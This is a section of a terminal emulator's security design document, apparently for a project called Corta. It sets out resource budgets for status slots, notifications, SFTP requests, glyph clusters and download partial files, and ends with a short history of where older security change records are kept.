## 7. Resource accounting and validation boundaries

For every resource influenced by PTY or peer data, reviews must identify:
input and decoded limits, retained bytes/entries, ownership lifetime,
per-session and process-wide budgets, cancellation/teardown, and behaviour
when a limit is exhausted. A per-frame limit does not bound accumulated
state. Charge retained resources until release; return reservations on
failure, cancellation, replacement and owner teardown. Test both rejection
and recovery, including work finishing after cancellation.

Program status has a per-session cap of one main slot plus 32 subtask slots,
matching Claude Code 2.1.310's maximum emitted set; OSC 21337 has one separate
metadata slot and cannot evict typed state. Each status retains at most
80 bytes of app name, 192 of title, 2,048 of message, 32 per colour field
and a bounded id. Kitty
retains at most eight incomplete messages of 4,096 encoded bytes each; a
ninth replaces the oldest, so abandoned messages cannot shut out later ones,
and an oversized transmission is discarded through its final chunk. Close
requests queue apart from the pending notice, at most eight ids, so closing
one id never discards another's unread notice. One pending notice and one
blocked edge are coalesced per terminal. Sessions own all core
metadata; RIS and session teardown release it. Only the waiting-episode
counter continues across RIS, so a new wait is never mistaken for one
already announced. The app retains one pending
notice, one delivery callback and one expiry callback per pane, all cancelled
on pane teardown/session replacement. State-derived attention carries a
waiting-episode identity and is invalidated when that episode ends; independent
program messages survive. Delivery rechecks visibility after coalescing and
authorization, and a stale submission completes/removes before a replacement
may submit. Shell command boundaries release stale children, progress and
metadata after a CLI crash. Aggregate memory scales with the number
of live panes; there is no global notification-text history or unbounded queue.

The implementation has parser, title-stack, underline-colour, cluster, image, texture, SFTP frame,
request/writer, directory-list and tree limits. New paths must name their
budget explicitly rather than assuming another layer accounts for them.
Cancelled SFTP requests that still owe a wire reply have a separate 1,024-ID
budget; exhausting it closes the session with a protocol error and releases
the ledger. Those IDs are never recycled into live requests before a reply.
Remote path breadcrumbs retain at most eight items (root, a folded ancestor,
and six trailing components), constructing only those prefixes. Slash trimming
walks the path once. Progress fractions sum peer sizes as floating point rather
than overflowing a fixed-width integer. Forward/backward tab processing stops
at the corresponding margin, regardless of the output's requested count.

An existing `.corta-part` name is a conflict under the default file-transfer
policy. Directory downloads reject staging-name collisions in the remote plan
and existing local partials before writing entries, even under a blanket
overwrite/resume choice; each file checks again before starting. Newly created
download partials use exclusive creation, so a file appearing after preflight
is neither truncated nor removed. Resuming or replacing an existing partial
requires an explicit single-file decision, except for automatic retries of a
partial whose device/inode identity belongs to the current download call.
These checks do not establish a
sandbox against a compromised local account racing already authorized files.
Glyph clusters are rejected before shaping beyond the core's 32-scalar
limit; oversized/non-finite ink is rejected before atlas eviction.
Directory proxy probes run away from the main actor, with at most two
filesystem checks process-wide and no pending queue. Under a hung mount the
proxy icon can remain absent; cancellation cannot interrupt a kernel stat.

The dated [follow-up verification record](https://github.com/noah-qin/Corta/blob/f632d5918653cc2feee28fe1baa0c0fd01e93c0e/docs/test-results/2026-10-02-follow-up.md)
separates repairs from available runtime evidence and environment limits.
It is not a claim that every supported machine or dependency path was tested.

---

## 8. History

Every security-relevant change up to 2026-10-14 was written up here as the
`S` series, S05–S21; that record is preserved at
[commit `ed9ea86`](https://github.com/noah-qin/Corta/blob/ed9ea86f793e20b211f6a79f886de389fadd7a3a/docs/SECURITY.md#7-change-log).
Since then a change's security reasoning lives in its pull request and
`CHANGELOG.md`, and this document records only the rule it leaves behind.
